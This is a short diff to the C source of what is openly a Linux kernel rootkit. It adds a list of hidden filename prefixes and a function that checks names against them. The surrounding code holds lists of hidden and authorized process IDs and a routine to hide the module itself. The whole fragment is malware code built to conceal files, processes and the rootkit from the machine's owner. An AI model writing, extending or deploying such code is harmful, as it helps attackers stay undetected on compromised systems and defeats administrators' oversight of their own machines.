@@ -24,6 +24,8 @@
 LIST_HEAD(hidden_pids_list);
 LIST_HEAD(authorized_pids_list);
 
+const string_t S_HIDDEN_PREFIXES[] = STRING_ARRAY(HIDDEN_PREFIXES);
+
 static bool b_hidden = false; // Is the rootkit hidden?
 
 static task_t *(*_find_get_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_get_task_by_vpid()`
@@ -49,6 +51,20 @@ int copy_chunked_from_user(void *p_dst, const void __user *p_usrc, unsigned long
         ui64_len -= n;
     } while (ui64_len);
     return 0;
+}
+
+bool is_filename_hidden(const char *const s_filename)
+{
+    size_t i;
+
+    // Check if the name starts with a hidden prefix
+    for (i = 0; S_HIDDEN_PREFIXES[i].s_str != NULL; ++i) {
+        if (strncmp(s_filename, S_HIDDEN_PREFIXES[i].s_str, S_HIDDEN_PREFIXES[i].sz_len) == 0) {
+            return true;
+        }
+    }
+
+    return false;
 }
 
 void hide_module(void)
